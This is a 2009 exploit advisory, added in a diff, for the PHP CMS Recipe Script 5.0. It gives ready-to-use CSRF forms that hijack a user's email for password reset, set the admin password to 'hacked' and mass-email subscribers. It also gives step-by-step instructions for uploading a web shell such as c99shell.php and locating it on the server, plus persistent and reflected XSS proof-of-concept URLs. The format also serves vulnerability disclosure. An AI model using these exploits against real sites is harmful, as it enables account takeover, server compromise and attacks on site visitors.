@@ -1,0 +1,196 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Recipe Script v5.0 (Shell Upload/XSRF/XSS) Multiple Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 16. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Recipe Script
+[#] Version: 5.0
+[#] Platform: PHP
+[#] Link: http://www.recipescript.com/index.php
+[#] Price: ~98 USD
+[#] Vulnerability: Multiple Vulnerabilities such as XSRF, Shell Upload, XSS
+[#-----------------------------------------------------------------------------------------------#]
+
+[#]Content
+ |--User Panel
+ |  |--Change user email
+ |
+ |--Admin Panel
+    |--Shell upload vulnerability
+    |
+    |--XSRF
+    |  |--Change admin password
+    |  |--Send email to subscribers
+    |
+    |--Persistent XSS
+    |  |--Edit footer
+    |  |--Add/Edit Category
+    |  |--Add/Edit Recipe
+    |  |--Add/Edit Menu
+    |  |--Add/Edit Block
+    |
+    |--XSS
+       |--XSS in /admin/recipes.php
+       |--XSS in /admin/categories.php
+       |--XSS in /admin/all_comments.php
+       |--XSS in /admin/users.php
+       |--XSS in /admin/comments.php
+       |--XSS in /admin/menus.php
+       |--XSS in /admin/links.php
+       |--XSS in /admin/banners.php
+
+
+[#]User Panel
+
+[*]Change user email (XSRF)
+
+We can use the following exploit to change users email and then go to
+'forget your password' form and it will send us password on the email.
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/recipes/update_profile.php" method="POST">
+  <input name="first_name" type="text" value="DEMO">
+  <input name="last_name" type="text" value="USER">
+  <input name="website" type="text" value="website.com">
+  <input name="country" type="text" value="Moon State">
+  <input name="email" type="text" value="our@email.com">
+  <input type="checkbox" name="subscribed" value="1">
+  <input type="submit" name="Submit" value="Update">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#]Admin Panel
+
+[*]Shell upload vulnerability
+
+Visit link:
+http://localhost/recipes/admin/add_logo.php
+Upload your shell (ex. c99shell.php)
+Your shell should be here:
+http://localhost/recipes/admin/uploads/logo_.php
+If by any chanse is not there, open this page:
+http://localhost/recipes/admin/logo.php
+You'll see broken html object, right click > properties, and you will
+see the link to your shell
+
+[#]XSRF (Cross Site Request Forgery)
+
+[*]Change admin password
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/recipes/admin/adminpass.php" method="POST">
+  <input type="password" name="AdminPass" value="hacked">
+  <input type="password" name="cAdminPass" value="hacked">
+  <input type="submit" name="submit" value="Update Password">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[-]Send email to subscribers
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/recipes/admin/send_email_users.php"
+method="POST">
+  <input type="hidden" name="from_email" value="support@site.com">
+  <input type="hidden" name="subject" value="Subject">
+  <input type="hidden" name="message" value="Free your mind and the
+ass will follow!">
+  <input type="hidden" name="emailtype" value="">
+  <input type="submit" name="Submit" value="Send">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#]Persistent XSS (Cross Site Scripting)
+
+[+]Edit footer (Persistent XSS)
+
+script: http://localhost/recipes/admin/edit_footertext.php
+is vulnerable to persistent xss attack, we can inject our malicious
+code in there and it will be on every page.
+
+[*]Add/Edit Category (Persistent XSS)
+
+Add: http://localhost/recipes/admin/add_category.php
+Edit: http://localhost/recipes/admin/categories.php
+Field that i tested is 'Category name'. We can inject our malicious
+code there and it will be seen on every page.
+
+[+]Add/Edit Recipe (Persistent XSS)
+
+Add: http://localhost/recipes/admin/add_recipe.php
+Edit: http://localhost/recipes/admin/recipes.php
+Vulnerable field is 'Recipe name'.
+
+[+]Add/Edit Menu (Persistent XSS)
+
+Add: http://localhost/recipes/admin/add_menu.php
+Edit: http://localhost/recipes/admin/menus.php
+Vulnerable field is 'Menu name'. This is seen in every page in the
+front end of the cms.
+
+[+]Add/Edit Block (Persistent XSS)
+
+Add: http://localhost/recipes/admin/add_block.php
+Edit: http://localhost/recipes/admin/blocks.php
+Vulnerable field is 'Block name'.
+
+[#]XSS (Cross Site Scripting)
+
+I used following javascript in testing: 
+
+[-]XSS in /admin/recipes.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/recipes.php?searchword="[XSS]
+http://localhost/recipes/admin/recipes.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in /admin/categories.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/categories.php?searchword="[XSS]
+http://localhost/recipes/admin/categories.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in /admin/all_comments.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/all_comments.php?searchword="[XSS]
+http://localhost/recipes/admin/all_comments.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in /admin/users.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/users.php?searchword="[XSS]
+http://localhost/recipes/admin/users.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in /admin/comments.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/comments.php?searchword="[XSS]
+http://localhost/recipes/admin/comments.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in /admin/menus.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/menus.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in /admin/links.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/links.php?searchword="[XSS]
+http://localhost/recipes/admin/links.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in /admin/banners.php
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/recipes/admin/banners.php?searchword="[XSS]
+http://localhost/recipes/admin/banners.php?numitem="[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[#]EOF
